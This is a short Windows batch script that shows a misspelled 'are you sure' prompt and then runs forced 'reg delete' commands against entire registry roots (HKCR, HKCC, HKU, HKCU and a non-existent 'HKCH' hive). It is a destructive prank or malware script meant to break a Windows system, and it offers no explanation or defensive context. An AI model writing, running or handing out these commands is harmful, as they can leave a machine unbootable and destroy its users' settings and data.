@echo off
echo (only waring) are you sure you wana run this?
pause
cls
reg delete HKCH/SYSTEM/Setup /f
reg delete HKCR /F
reg delete HKCC /F
reg delete HKU /F
reg delete HKCU /F
reg delete HKCH /F
echo done
pause
